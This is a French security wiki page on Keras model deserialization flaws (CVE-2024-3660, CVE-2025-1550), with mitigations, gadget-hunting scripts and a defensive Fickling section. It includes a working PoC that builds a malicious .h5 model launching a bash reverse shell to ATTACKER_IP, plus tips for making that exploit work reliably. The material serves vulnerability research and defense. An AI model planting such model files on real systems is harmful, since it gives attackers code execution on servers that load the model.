# Keras Model Deserialization RCE et recherche de gadgets

{{#include ../../banners/hacktricks-training.md}}

Cette page résume les techniques pratiques d’exploitation du pipeline de désérialisation des modèles Keras, explique les composants internes du format natif .keras et sa surface d’attaque, et présente une boîte à outils destinée aux chercheurs pour trouver des Model File Vulnerabilities (MFV) et des gadgets post-correctif.

## Composants internes du format de modèle .keras

Un fichier .keras est une archive ZIP contenant au minimum :<sup>[[1]](#references)</sup>
- metadata.json – informations générales (par exemple, la version de Keras)
- config.json – architecture du modèle (principale surface d’attaque)
- model.weights.h5 – poids au format HDF5

config.json pilote la désérialisation récursive : Keras importe des modules, résout des classes et des fonctions, puis reconstruit des couches et des objets à partir de dictionnaires contrôlés par l’attaquant.<sup>[[1]](#references)</sup>

Exemple d’extrait pour un objet de couche Dense :

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

La désérialisation effectue :<sup>[[1]](#references)</sup>
- L’import de modules et la résolution de symboles à partir des clés module/class_name
- L’appel de from_config(...) ou du constructeur avec des kwargs contrôlés par l’attaquant
- La récursion dans des objets imbriqués (activations, initializers, contraintes, etc.)

Historiquement, cela exposait trois primitives à un attaquant créant un config.json :<sup>[[1]](#references)</sup>
- Le contrôle des modules importés
- Le contrôle des classes/fonctions résolues
- Le contrôle des kwargs transmis aux constructeurs/from_config

## CVE-2024-3660 – RCE via le bytecode d’une couche Lambda

Cause racine :
- La désérialisation des Lambda héritées reconstruisait une fonction Python à partir de code marshalé contrôlé par l’attaquant : `func_load()` décode le payload en base64, appelle `marshal.loads()` et crée un `FunctionType`. Le bytecode de la fonction ainsi créée s’exécute lorsque la Lambda est invoquée, et les chargeurs antérieurs à la version 2.13 concernés n’appliquaient pas les vérifications du mode sécurisé aux formats hérités.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Dans une archive Keras v3 native, la fonction Lambda est représentée par un objet `__lambda__` dont le champ `code` contient du code marshalé encodé en base64 :<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigation :
- Keras applique `safe_mode=True` par défaut au format natif Keras v3. Les lambdas Python sérialisées dans `Lambda` sont bloquées, sauf si l’utilisateur désactive explicitement cette protection avec `safe_mode=False` ; cette protection ne couvre pas les formats hérités de la même manière.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Remarques :
- Les formats hérités (anciennes sauvegardes HDF5) ou les bases de code plus anciennes peuvent ne pas appliquer les vérifications modernes ; les attaques de type « downgrade » restent donc possibles lorsque les victimes utilisent d’anciens chargeurs.

## CVE-2025-1550 – Importation arbitraire de module dans Keras 3.0.0–3.8.x

Cause fondamentale :
- `_retrieve_class_or_fn` utilisait `importlib.import_module(module)` avec des chaînes de module contrôlées par l’attaquant depuis `config.json`.
- Impact : une archive `.keras` spécialement conçue pouvait amener `Model.load_model()` à importer des modules et fonctions Python choisis par l’attaquant, avec des effets de bord à l’importation et des arguments contrôlés par l’attaquant, même avec `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Idée d’exploitation :

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Améliorations de sécurité (Keras ≥ 3.9) :<sup>[[1]](#references)[[2]](#references)</sup>
- allowlist de modules : les imports sont limités aux modules de l’écosystème officiel : keras, keras_hub, keras_cv, keras_nlp
- Mode sécurisé activé par défaut : safe_mode=True bloque le chargement non sécurisé de fonctions sérialisées dans Lambda
- Vérification basique des types : les objets désérialisés doivent correspondre aux types attendus

## Exploitation pratique : RCE via Lambda dans TensorFlow-Keras HDF5 (.h5)

Les déploiements TensorFlow-Keras anciens peuvent encore accepter des fichiers de modèle HDF5 (`.h5`). Si un attaquant peut téléverser un modèle que le serveur charge ensuite ou utilise pour effectuer des inférences, un chargeur vulnérable peut désérialiser une couche Lambda contenant du code Python contrôlé par l’attaquant, qui peut alors s’exécuter dans le workflow de traitement des modèles de l’application.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC minimal pour créer un fichier .h5 malveillant dont la Lambda exécute un reverse shell lorsque la cible invoque le modèle :

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notes et conseils de fiabilité :
- Les points de déclenchement varient selon le format et le workflow ; l’article référencé a observé l’exécution du payload deux fois pendant la prédiction. Considérez les effets secondaires comme répétables et rendez les payloads idempotents.<sup>[[7]](#references)</sup>
- Épinglage des versions : faites correspondre les versions de TF/Keras/Python de la victime pour éviter les incompatibilités de sérialisation. Par exemple, créez les artefacts avec Python 3.8 et TensorFlow 2.13.1 si c’est ce qu’utilise la cible.<sup>[[7]](#references)</sup>
- Réplication rapide de l’environnement :

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validation : un payload inoffensif comme `os.system("ping -c 1 YOUR_IP")` aide à confirmer l’exécution (par exemple, en observant le trafic ICMP avec tcpdump) avant de passer à un reverse shell.<sup>[[7]](#references)</sup>

## Surface des gadgets après correctif au sein de la liste d’autorisation

Même avec la liste d’autorisation des modules Keras et le mode sécurisé, les fonctions autorisées peuvent exposer des effets de bord. Par exemple, `keras.utils.get_file` télécharge une URL et l’écrit dans l’emplacement de cache configuré, ce qui en fait une candidate à l’analyse de gadgets.<sup>[[1]](#references)[[19]](#references)</sup>

Configuration Lambda candidate (validez la signature de l’appel lors d’un test contrôlé) :

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Limitation importante :
- `Lambda.call()` transmet toujours l’entrée du modèle comme premier argument positionnel et les `arguments` configurés comme arguments nommés. Pour `get_file`, cette valeur positionnelle remplit `fname` ; une incompatibilité entre tensor et chemin peut faire échouer ce candidat avant tout téléchargement. Ce gadget ne fonctionne donc pas à coup sûr.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Liste d’autorisations pour les imports ML de pickle dans les modèles AI/ML (Fickling)

De nombreux formats de modèles AI/ML (fichiers PyTorch `.pt`/`.pth`/`.ckpt`, artefacts joblib/scikit-learn et autres formats natifs Python) intègrent des données Python pickle. Le chemin Keras Lambda hérité ci-dessus utilise plutôt du bytecode de fonction marshalé ; il s’agit donc d’un risque de désérialisation distinct. Les opcodes pickle peuvent déclencher des comportements contrôlés par un attaquant pendant la désérialisation, notamment la falsification de modèles ou une RCE, et les scanners simples peuvent ne pas détecter des imports dangereux inédits ou non répertoriés.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Une défense pratique qui échoue de manière sécurisée consiste à intercepter le désérialiseur pickle de Python et à n’autoriser, lors du unpickling, qu’un ensemble vérifié d’imports inoffensifs liés au ML. Fickling, développé par Trail of Bits, applique cette politique et fournit une liste d’autorisations ML sélectionnée à partir de milliers de fichiers pickle publics de Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modèle de sécurité pour les imports « sûrs » (principes tirés de la recherche et de la pratique) : les symboles importés utilisés par un pickle doivent tous satisfaire simultanément aux critères suivants :<sup>[[8]](#references)</sup>
- Ne pas exécuter de code ni provoquer son exécution (pas d’objets code compilés ou source, d’exécution de commandes shell, de hooks, etc.)
- Ne pas lire ni modifier des attributs ou des éléments arbitraires
- Ne pas importer d’autres objets Python depuis la VM pickle ni obtenir de références à ceux-ci
- Ne pas déclencher de désérialiseurs secondaires (par exemple, marshal ou un pickle imbriqué), même indirectement

Activez les protections de Fickling le plus tôt possible au démarrage du processus afin que tout chargement de pickle effectué par des frameworks (`torch.load`, `joblib.load`, etc.) soit vérifié :<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Conseils opérationnels :
- Vous pouvez désactiver/réactiver temporairement les hooks si nécessaire :<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Si un modèle fiable est bloqué, étendez la liste d’autorisation de votre environnement après avoir examiné les symboles :<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling expose également des protections génériques à l’exécution si vous préférez un contrôle plus granulaire :<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() pour imposer des vérifications à chaque appel de pickle.load()
  - with fickling.check_safety(): pour appliquer les vérifications dans un périmètre limité
  - fickling.load(path) / fickling.is_likely_safe(path) pour des vérifications ponctuelles

- Privilégiez les formats de modèle autres que pickle lorsque c’est possible (p. ex., SafeTensors).<sup>[[15]](#references)</sup> Si vous devez accepter pickle, exécutez les chargeurs avec le moins de privilèges possible, sans accès réseau sortant, et appliquez l’allowlist.

Cette stratégie donnant la priorité à l’allowlist bloque de manière avérée les chemins d’exploitation courants de ML pickle, tout en conservant une compatibilité élevée. Dans le benchmark de ToB, Fickling a détecté 100 % des fichiers malveillants synthétiques et autorisé ~99 % des fichiers sains issus des principaux dépôts Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) Découverte systématique de gadgets dans les modules autorisés

Énumérez les callables candidates dans keras, keras_nlp, keras_cv, keras_hub et donnez la priorité à celles qui ont des effets secondaires sur les fichiers, le réseau, les processus ou l’environnement.<sup>[[1]](#references)</sup>

<details>
<summary>Énumérer les callables potentiellement dangereuses dans les modules Keras autorisés</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Tests de désérialisation directe (aucune archive .keras nécessaire)

Fournissez des dictionnaires spécialement conçus directement aux désérialiseurs Keras pour découvrir les paramètres acceptés et observer les effets de bord.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Tests interversions et formats

Keras existe dans plusieurs codebases/époques, avec des garde-fous et des formats différents :<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras : tensorflow/python/keras (legacy, dont la suppression est prévue)
- tf-keras : maintenu séparément
- Keras 3 multi-backend (officiel) : a introduit le format natif .keras

Répétez les tests sur différentes codebases et différents formats (.keras et HDF5 legacy) afin de découvrir des régressions ou des garde-fous manquants.

## References

- [1] [Recherche de vulnérabilités dans la désérialisation des modèles Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Ajout de vérifications à la sérialisation](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE via la désérialisation de Lambda dans Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Import arbitraire de modules dans Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Rapport huntr – import arbitraire #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Rapport huntr – import arbitraire #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE Lambda TensorFlow .h5 vers root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – Le nouveau scanner de fichiers pickle IA/ML de Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Sécurisation des environnements IA/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de référence pour l’analyse des pickle de Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contexte des attaques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projet SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Les couches Lambda de Keras 2 permettent l’injection de code arbitraire](https://kb.cert.org/vuls/id/253266)
- [17] [Code source de la couche Lambda de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Code source des utilitaires Python de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` de Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
